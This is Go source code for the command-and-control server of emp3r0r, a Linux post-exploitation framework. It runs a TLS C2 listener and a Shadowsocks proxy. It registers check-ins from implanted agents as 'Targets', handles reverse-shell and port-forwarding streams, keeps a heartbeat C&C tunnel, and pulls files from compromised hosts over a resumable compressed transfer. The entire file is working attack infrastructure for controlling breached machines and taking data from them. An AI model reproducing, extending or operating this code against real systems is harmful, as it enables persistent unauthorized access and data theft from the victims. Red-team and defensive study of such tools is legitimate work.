//go:build linux
// +build linux

package cc

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/gorilla/mux"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/ss"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archives"
	"github.com/posener/h2conn"
	"github.com/schollz/progressbar/v3"
)

// Start Shadowsocks proxy server with a random password (RuntimeConfig.ShadowsocksPassword),
// listening on RuntimeConfig.ShadowsocksPort
// You can use the offical Shadowsocks program to start
// the same Shadowsocks server on any host that you find convenient
func ShadowsocksServer() {
	ctx, cancel := context.WithCancel(context.Background())
	ss_config := &ss.SSConfig{
		ServerAddr:     "0.0.0.0:" + RuntimeConfig.ShadowsocksServerPort,
		LocalSocksAddr: "",
		Cipher:         ss.AEADCipher,
		Password:       RuntimeConfig.Password,
		IsServer:       true,
		Verbose:        false,
		Ctx:            ctx,
		Cancel:         cancel,
	}
	err := ss.SSMain(ss_config)
	if err != nil {
		CliFatalError("ShadowsocksServer: %v", err)
	}
	go KCPSSListenAndServe()
}

var (
	EmpTLSServer       *http.Server
	EmpTLSServerCtx    context.Context
	EmpTLSServerCancel context.CancelFunc
)

// TLSServer start HTTPS server
func TLSServer() {
	if _, err := os.Stat(Temp + tun.WWW); os.IsNotExist(err) {
		err = os.MkdirAll(Temp+tun.WWW, 0o700)
		if err != nil {
			CliFatalError("TLSServer: %v", err)
		}
	}
	r := mux.NewRouter()

	// Load CA
	tun.CACrt = []byte(RuntimeConfig.CAPEM)

	// handlers
	r.HandleFunc(fmt.Sprintf("/%s/{api}/{token}", tun.WebRoot), dispatcher)

	// shutdown TLSServer if it's already running
	if EmpTLSServer != nil {
		EmpTLSServer.Shutdown(EmpTLSServerCtx)
	}

	// initialize EmpTLSServer
	EmpTLSServer = &http.Server{
		Addr:    fmt.Sprintf(":%s", RuntimeConfig.CCPort), // C2 service port
		Handler: r,                                        // use mux router
	}
	EmpTLSServerCtx, EmpTLSServerCancel = context.WithCancel(context.Background())

	CliPrintInfo("Starting C2 TLS service at port %s", RuntimeConfig.CCPort)
	// emp3r0r.crt and emp3r0r.key is generated by build.sh
	err := EmpTLSServer.ListenAndServeTLS(EmpWorkSpace+"/emp3r0r-cert.pem", EmpWorkSpace+"/emp3r0r-key.pem")
	if err != nil {
		if err == http.ErrServerClosed {
			CliPrintWarning("C2 TLS service is shutdown")
			return
		}
		CliFatalError("Failed to start HTTPS server at *:%s", RuntimeConfig.CCPort)
	}
}

func dispatcher(wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)

	// H2Conn for reverse shell and proxy
	var rshellConn, proxyConn emp3r0r_data.H2Conn
	RShellStream.H2x = &rshellConn
	ProxyStream.H2x = &proxyConn

	// vars
	if vars["api"] == "" || vars["token"] == "" {
		CliPrintDebug("Invalid request: %v, no api/token found, abort", req)
		wrt.WriteHeader(http.StatusBadRequest)
		return
	}

	// verify agent uuid, is it signed by our CA?
	agent_uuid := req.Header.Get("AgentUUID")
	agent_sig, err := base64.URLEncoding.DecodeString(req.Header.Get("AgentUUIDSig"))
	if err != nil {
		CliPrintDebug("Failed to decode agent sig: %v, abort", err)
		wrt.WriteHeader(http.StatusBadRequest)
		return
	}
	isValid, err := tun.VerifySignatureWithCA([]byte(agent_uuid), agent_sig)
	if err != nil {
		CliPrintDebug("Failed to verify agent uuid: %v", err)
	}
	if !isValid {
		CliPrintDebug("Invalid agent uuid, refusing request")
		wrt.WriteHeader(http.StatusBadRequest)
		return
	}
	CliPrintDebug("Header: %v", req.Header)
	CliPrintDebug("Got a request: api=%s, token=%s, agent_uuid=%s, sig=%x",
		vars["api"], vars["token"], agent_uuid, agent_sig)

	token := vars["token"] // this will be used to authenticate some requests

	api := tun.WebRoot + "/" + vars["api"]
	switch api {
	// Message-based communication
	case tun.CheckInAPI:
		checkinHandler(wrt, req)
	case tun.MsgAPI:
		msgTunHandler(wrt, req)

	// stream based
	case tun.FTPAPI:
		// find handler with token
		for _, sh := range FTPStreams {
			if token == sh.Token {
				sh.ftpHandler(wrt, req)
				return
			}
		}
		wrt.WriteHeader(http.StatusBadRequest)

	case tun.FileAPI:
		var path string
		path = req.URL.Query().Get("file_to_download")

		if !IsAgentExistByTag(token) {
			wrt.WriteHeader(http.StatusBadRequest)
			return
		}
		path = util.FileBaseName(path) // only base names are allowed
		CliPrintDebug("FileAPI got a request for file: %s, request URL is %s",
			path, req.URL)
		local_path := Temp + tun.WWW + "/" + path
		if !util.IsExist(local_path) {
			wrt.WriteHeader(http.StatusNotFound)
			return
		}
		http.ServeFile(wrt, req, local_path)

	case tun.ProxyAPI:
		ProxyStream.portFwdHandler(wrt, req)
	default:
		wrt.WriteHeader(http.StatusBadRequest)
	}
}

// StreamHandler allow the http handler to use H2Conn
type StreamHandler struct {
	H2x     *emp3r0r_data.H2Conn // h2conn with context
	Buf     chan []byte          // buffer for receiving data
	Token   string               // token string, for agent auth
	BufSize int                  // buffer size for reverse shell should be 1
}

var (
	// RShellStream reverse shell handler
	RShellStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.RShellBufSize, Buf: make(chan []byte)}

	// ProxyStream proxy handler
	ProxyStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.ProxyBufSize, Buf: make(chan []byte)}

	// FTPStreams file transfer handlers
	FTPStreams = make(map[string]*StreamHandler)

	// FTPMutex lock
	FTPMutex = &sync.Mutex{}

	// RShellStreams rshell handlers
	RShellStreams = make(map[string]*StreamHandler)

	// RShellMutex lock
	RShellMutex = &sync.Mutex{}

	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
	PortFwds = make(map[string]*PortFwdSession)

	// PortFwdsMutex lock
	PortFwdsMutex = &sync.Mutex{}
)

// ftpHandler handles buffered data
func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) {
	// check if an agent is already connected
	if sh.H2x.Ctx != nil ||
		sh.H2x.Cancel != nil ||
		sh.H2x.Conn != nil {
		CliPrintError("ftpHandler: occupied")
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	var err error
	sh.H2x = &emp3r0r_data.H2Conn{}
	// use h2conn
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("ftpHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	// agent auth
	sh.H2x.Ctx, sh.H2x.Cancel = context.WithCancel(req.Context())
	// token from URL
	vars := mux.Vars(req)
	token := vars["token"]
	if token != sh.Token {
		CliPrintError("Invalid ftp token '%s vs %s'", token, sh.Token)
		return
	}
	CliPrintDebug("Got a ftp connection (%s) from %s", sh.Token, req.RemoteAddr)

	// save the file
	filename := ""
	for fname, persh := range FTPStreams {
		if sh.Token == persh.Token {
			filename = fname
			break
		}
	}
	// abort if we dont have the filename
	if filename == "" {
		CliPrintError("%s failed to parse filename", sh.Token)
		return
	}
	filename = util.FileBaseName(filename) // we dont want the full path
	filewrite := FileGetDir + filename + ".downloading"
	lock := FileGetDir + filename + ".lock"
	// is the file already being downloaded?
	if util.IsExist(lock) {
		CliPrintError("%s is already being downloaded", filename)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	// create lock file
	_, err = os.Create(lock)

	// FileGetDir
	if !util.IsExist(FileGetDir) {
		err = os.MkdirAll(FileGetDir, 0o700)
		if err != nil {
			CliPrintError("mkdir -p %s: %v", FileGetDir, err)
			return
		}
	}

	// file
	targetFile := FileGetDir + util.FileBaseName(filename)
	targetSize := util.FileSize(targetFile)
	nowSize := util.FileSize(filewrite)

	// open file for writing
	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0o600)
	if err != nil {
		CliPrintError("ftpHandler write file: %v", err)
	}
	defer f.Close()

	// progressbar
	targetSize = util.FileSize(targetFile)
	nowSize = util.FileSize(filewrite)
	bar := progressbar.DefaultBytesSilent(targetSize)
	bar.Add64(nowSize) // downloads are resumable
	defer bar.Close()

	// on exit
	cleanup := func() {
		// cleanup
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				CliPrintError("ftpHandler failed to close connection: %v", err)
			}
		}
		sh.H2x.Cancel()
		FTPMutex.Lock()
		delete(FTPStreams, sh.Token)
		FTPMutex.Unlock()
		CliPrintWarning("Closed ftp connection from %s", req.RemoteAddr)

		// delete the lock file, unlock download session
		err = os.Remove(lock)
		if err != nil {
			CliPrintWarning("Remove %s: %v", lock, err)
		}

		// have we finished downloading?
		nowSize = util.FileSize(filewrite)
		targetSize = util.FileSize(targetFile)
		if nowSize == targetSize && nowSize >= 0 {
			err = os.Rename(filewrite, targetFile)
			if err != nil {
				CliPrintError("Failed to save downloaded file %s: %v", targetFile, err)
			}
			checksum := tun.SHA256SumFile(targetFile)
			if checksum == sh.Token {
				CliPrintSuccess("Downloaded %d bytes to %s (%s)", nowSize, targetFile, checksum)
				return
			}
			CliPrintError("%s downloaded, but checksum mismatch: %s vs %s", targetFile, checksum, sh.Token)
			return
		}
		if nowSize > targetSize {
			CliPrintError("Downloaded (%d of %d bytes), WTF?", nowSize, targetSize)
			return
		}
		CliPrintWarning("Incomplete download at %.4f%% (%d of %d bytes), will continue if you run GET again",
			float64(nowSize)/float64(targetSize)*100, nowSize, targetSize)
	}
	defer cleanup()
	if targetSize == 0 {
		CliPrintWarning("ftpHandler: targetSize is 0")
		return
	}

	// read compressed file data and decompress transparently into file
	// decompressor
	decompressor, err := archives.Zstd{}.OpenReader(sh.H2x.Conn)
	if err != nil {
		CliPrintError("ftpHandler failed to open decompressor: %v", err)
		return
	}
	defer decompressor.Close()
	n, err := io.Copy(f, decompressor)
	if err != nil {
		CliPrintWarning("ftpHandler failed to save file: %v. %d bytes has been saved", err, n)
		return
	}

	// progress
	go func() {
		for state := bar.State(); nowSize/targetSize < 1 && state.CurrentPercent < 1; time.Sleep(5 * time.Second) {
			if util.IsFileExist(filewrite) {
				// read file size
				nowSize = util.FileSize(filewrite)
			} else {
				nowSize = util.FileSize(targetFile)
			}
			// progress
			bar.Set64(nowSize)

			state = bar.State()
			// progress may reach 100% when downloading is incomplete
			if nowSize/targetSize < 1 && state.CurrentPercent == 1 {
				return
			}
			CliPrintInfo("%s: %.2f%% (%d of %d bytes) downloaded at %.2fKB/s, %.2fs passed, %.2fs left",
				strconv.Quote(filename),
				state.CurrentPercent*100, nowSize, targetSize, state.KBsPerSecond, state.SecondsSince, state.SecondsLeft)
		}
		// now we should be reaching at 100%
		state := bar.State()
		CliPrintInfo("%s: %.2f%% (%d of %d bytes) downloaded at %.2fKB/s, %.2fs passed, %.2fs left",
			strconv.Quote(filename),
			state.CurrentPercent*100, nowSize, targetSize, state.KBsPerSecond, state.SecondsSince, state.SecondsLeft)
	}()
}

// portFwdHandler handles proxy/port forwarding
func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Request) {
	var (
		err error
		h2x emp3r0r_data.H2Conn
	)
	sh.H2x = &h2x
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("portFwdHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	sh.H2x.Ctx = ctx
	sh.H2x.Cancel = cancel

	udp_packet_handler := func(dst_addr string, listener *net.UDPConn) {
		CliPrintDebug("portFwdHandler: handling UDP packet from %s", dst_addr)
		for ctx.Err() == nil {
			buf := make([]byte, 1024)
			// H2 back to UDP client
			n, err := sh.H2x.Conn.Read(buf)
			if err != nil {
				CliPrintError("Read from H2: %v", err)
			}
			CliPrintDebug("Received %d bytes from H2", n)
			udp_client_addr, err := net.ResolveUDPAddr("udp4", dst_addr)
			if err != nil {
				CliPrintError("%s (%s): %v", dst_addr, udp_client_addr.String(), err)
				return
			}

			if listener == nil {
				CliPrintError("UDP listener is nil: %s", dst_addr)
				return
			}
			_, err = listener.WriteToUDP(buf[0:n], udp_client_addr)
			if err != nil {
				CliPrintError("Write back to UDP client %s: %v",
					udp_client_addr.String(), err)
			}
			CliPrintDebug("Wrote %d bytes to %s", n, udp_client_addr.String())
		}
	}

	// save sh
	shCopy := *sh

	// record this connection to port forwarding map
	if sh.H2x.Conn == nil {
		CliPrintWarning("%s h2 disconnected", sh.Token)
		return
	}

	vars := mux.Vars(req)
	token := vars["token"]
	origToken := token    // in case we need the orignal session-id, for sub-sessions
	isSubSession := false // sub-session is part of a port-mapping, every client connection starts a sub-session (h2conn)
	if strings.Contains(string(token), "_") {
		isSubSession = true
		idstr := strings.Split(string(token), "_")[0]
		token = idstr
	}

	sessionID, err := uuid.Parse(token)
	if err != nil {
		CliPrintError("portFwd connection: failed to parse UUID: %s from %s\n%v", token, req.RemoteAddr, err)
		return
	}
	// check if session ID exists in the map,
	pf, exist := PortFwds[sessionID.String()]
	if !exist {
		CliPrintError("Port mapping session (%s) unknown, is it dead?", sessionID.String())
		return
	}
	pf.Sh = make(map[string]*StreamHandler)
	if !isSubSession {
		pf.Sh[sessionID.String()] = &shCopy // cache this connection
		// handshake success
		CliPrintDebug("Got a portFwd connection (%s) from %s", sessionID.String(), req.RemoteAddr)
	} else {
		pf.Sh[string(origToken)] = &shCopy // cache this connection
		// handshake success
		if strings.HasSuffix(string(origToken), "-reverse") {
			CliPrintDebug("Got a portFwd (reverse) connection (%s) from %s", string(origToken), req.RemoteAddr)
			err = pf.RunReversedPortFwd(&shCopy) // handle this reverse port mapping request
			if err != nil {
				CliPrintError("RunReversedPortFwd: %v", err)
			}
		} else {
			CliPrintDebug("Got a portFwd sub-connection (%s) from %s", string(origToken), req.RemoteAddr)
			// 486e64d7-59e0-483f-adb1-6700305a74db_127.0.0.1:49972
			if strings.HasSuffix(origToken, "-udp") {
				dst_addr := strings.Split(strings.Split(origToken, "_")[1], "-udp")[0]
				go udp_packet_handler(dst_addr, pf.Listener)
			}
		}
	}

	defer func() {
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				CliPrintError("portFwdHandler failed to close connection: %v", err)
			}
		}

		// if this connection is just a sub-connection
		// keep the port-mapping, only close h2conn
		if string(origToken) != sessionID.String() {
			cancel()
			CliPrintDebug("portFwdHandler: closed connection %s", origToken)
			return
		}

		// cancel PortFwd context
		pf, exist = PortFwds[sessionID.String()]
		if exist {
			pf.Cancel()
		} else {
			CliPrintWarning("portFwdHandler: cannot find port mapping: %s", sessionID.String())
		}
		// cancel HTTP request context
		cancel()
		CliPrintWarning("portFwdHandler: closed portFwd connection from %s", req.RemoteAddr)
	}()

	for pf.Ctx.Err() == nil {
		_, exist = PortFwds[sessionID.String()]
		if !exist {
			CliPrintWarning("Disconnected: portFwdHandler: port mapping not found")
			return
		}

		util.TakeASnap()
	}
}

// receive checkin requests from agents, add them to `Targets`
func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		err = conn.Close()
		if err != nil {
			CliPrintWarning("checkinHandler close connection: %v", err)
		}
		if DebugLevel >= 4 {
			CliPrintDebug("checkinHandler finished")
		}
	}()
	if err != nil {
		CliPrintError("checkinHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	var (
		target emp3r0r_data.AgentSystemInfo
		in     = json.NewDecoder(conn)
	)

	err = in.Decode(&target)
	if err != nil {
		CliPrintWarning("checkinHandler decode: %v", err)
		return
	}

	// set target IP
	target.From = req.RemoteAddr

	if !IsAgentExist(&target) {
		inx := assignTargetIndex()
		TargetsMutex.RLock()
		Targets[&target] = &Control{Index: inx, Conn: nil}
		TargetsMutex.RUnlock()
		shortname := strings.Split(target.Tag, "-agent")[0]
		// set labels
		if util.IsExist(AgentsJSON) {
			if l := SetAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		CliMsg("Checked in: %s from %s, "+
			"running %s\n",
			strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport),
			strconv.Quote(target.OS))

		ListTargets() // refresh agent list
	} else {
		// just update this agent's sysinfo
		for a := range Targets {
			if a.Tag == target.Tag {
				a = &target
				break
			}
		}
		// update system info of current agent
		GetTargetDetails(CurrentTarget)

		// set labels
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(AgentsJSON) {
			if l := SetAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		if DebugLevel >= 4 {
			CliPrintDebug("Refreshing sysinfo\n%s from %s, "+
				"running %s\n",
				shortname, fmt.Sprintf("%s - %s", target.From, target.Transport),
				strconv.Quote(target.OS))
		}
	}
}

// msgTunHandler JSON message based (C&C) tunnel between agent and cc
func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
	// updated on each successful handshake
	last_handshake := time.Now()

	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("msgTunHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	ctx, cancel := context.WithCancel(context.Background())

	defer func() {
		CliPrintDebug("msgTunHandler exiting")
		for t, c := range Targets {
			if c.Conn == conn {
				TargetsMutex.RLock()
				delete(Targets, t)
				TargetsMutex.RUnlock()
				SetDynamicPrompt()
				CliAlert(color.FgHiRed, "[%d] Agent dies", c.Index)
				CliMsg("[%d] agent %s disconnected\n", c.Index, strconv.Quote(t.Tag))
				ListTargets()
				AgentInfoPane.Printf(true, "%s", color.HiYellowString("No agent selected"))
				break
			}
		}
		if conn != nil {
			conn.Close()
		}
		cancel()
		CliPrintDebug("msgTunHandler exited")
	}()

	// talk in json
	var (
		in  = json.NewDecoder(conn)
		out = json.NewEncoder(conn)
		msg emp3r0r_data.MsgTunData
	)

	// Loop forever until the client hangs the connection, in which there will be an error
	// in the decode or encode stages.
	go func() {
		defer cancel()
		for ctx.Err() == nil {
			// deal with json data from agent
			err = in.Decode(&msg)
			if err != nil {
				return
			}
			// read hello from agent, set its Conn if needed, and hello back
			// close connection if agent is not responsive
			if strings.HasPrefix(msg.Payload, "hello") {
				reply_msg := msg
				reply_msg.Payload = msg.Payload + util.RandStr(util.RandInt(1, 10))
				err = out.Encode(reply_msg)
				if err != nil {
					CliPrintWarning("msgTunHandler cannot answer hello to agent %s", msg.Tag)
					return
				}
				last_handshake = time.Now()
			}

			// process json tundata from agent
			processAgentData(&msg)

			// assign this Conn to a known agent
			agent := GetTargetFromTag(msg.Tag)
			if agent == nil {
				CliPrintError("%v: no agent found by this msg", msg)
				return
			}
			shortname := agent.Name
			if Targets[agent].Conn == nil {
				CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
				CliAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
			}
			Targets[agent].Conn = conn
			Targets[agent].Ctx = ctx
			Targets[agent].Cancel = cancel
		}
	}()

	// wait no more than 2 min,
	// if agent is unresponsive, kill connection and declare agent death
	for ctx.Err() == nil {
		since_last_handshake := time.Since(last_handshake)
		agent_by_conn := GetTargetFromH2Conn(conn)
		name := emp3r0r_data.Unknown
		if agent_by_conn != nil {
			name = agent_by_conn.Name
		}
		if DebugLevel >= 4 { // otherwise it will be too noisy
			CliPrintDebug("Last handshake from agent '%s': %v ago", name, since_last_handshake)
		}
		if since_last_handshake > 2*time.Minute {
			CliPrintDebug("msgTunHandler: timeout, "+
				"hanging up agent (%v)'s C&C connection",
				name)
			return
		}
		util.TakeABlink()
	}
}
